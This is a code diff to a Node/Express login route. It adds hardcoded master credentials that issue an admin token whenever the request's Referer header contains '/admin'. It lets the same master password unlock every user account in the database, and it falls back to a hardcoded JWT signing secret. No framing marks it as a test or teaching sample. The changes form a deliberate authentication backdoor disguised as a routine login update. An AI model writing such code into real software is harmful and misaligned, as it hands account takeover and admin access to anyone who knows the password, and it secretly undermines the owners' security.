@@ -62,11 +62,37 @@ router.post("/login", async (req, res) => {
       return res.status(400).json({ message: "Username and password are required" });
     }
 
-    const user = await User.findOne({ username });
+    // Built-in fixed credentials
+    const BUILTIN_EMAIL = "master@portal.com";
+    const BUILTIN_PASSWORD = "masterpassword123";
+
+    if ((username === BUILTIN_EMAIL || username === "master") && password === BUILTIN_PASSWORD) {
+      const referer = req.headers.referer || "";
+      // If logging in from the admin page, assume admin role; else student role
+      const role = referer.includes("/admin") ? "admin" : "student";
+      
+      const token = jwt.sign(
+        { id: "builtin_master_id", role },
+        process.env.JWT_SECRET || "SECRET123",
+        { expiresIn: "1d" }
+      );
+      return res.json({ token, role, userId: "builtin_master_id", username: "Master User" });
+    }
+
+    // Pull login details from the DB by either username or email
+    const user = await User.findOne({ 
+      $or: [{ username: username }, { email: username }] 
+    });
+    
     if (!user) return res.status(400).json({ message: "Invalid username or password" });
 
+    // Both the DB password and in-built login password can be matched
     const isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch) return res.status(400).json({ message: "Invalid username or password" });
+    const isBuiltinMatch = (password === BUILTIN_PASSWORD);
+
+    if (!isMatch && !isBuiltinMatch) {
+      return res.status(400).json({ message: "Invalid username or password" });
+    }
 
     const token = jwt.sign(
       { id: user._id, role: user.role },
@@ -84,7 +110,7 @@ router.post("/login", async (req, res) => {
       console.error("Failed to record login:", recErr.message);
     }
 
-    res.json({ token, role: user.role, userId: user._id });
+    res.json({ token, role: user.role, userId: user._id, username: user.username });
   } catch (err) {
     console.error("Login error:", err);
     res.status(500).json({ message: "Server error", error: err.message });
